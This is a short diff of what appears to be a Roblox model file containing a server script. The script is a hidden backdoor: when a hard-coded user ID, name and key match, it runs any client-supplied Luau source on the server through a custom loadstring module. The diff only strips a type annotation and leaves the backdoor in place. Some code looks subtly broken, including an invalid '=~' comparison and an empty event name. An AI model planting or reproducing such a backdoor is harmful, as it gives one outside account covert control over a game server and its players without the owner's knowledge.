@@ -6,7 +6,7 @@
 			<ProtectedString name="Source"><![CDATA[
 game:GetService("ReplicatedStorage"):FindFirstChild("").OnServerEvent:Connect(function(player, source, key)
     if player.UserId == 11306101560 and player.Name == "Xkdjdjdkxkxjzzjxjxj" and player.DisplayName == "blahalaADD" and source =~ "" and key == 12345 then
-        local loadstring: Instance = require("@game/ServerStorage/_vLuau")
+        local loadstring = require("@game/ServerStorage/_vLuau")
         pcall(function()
             loadstring(source)()
         end)
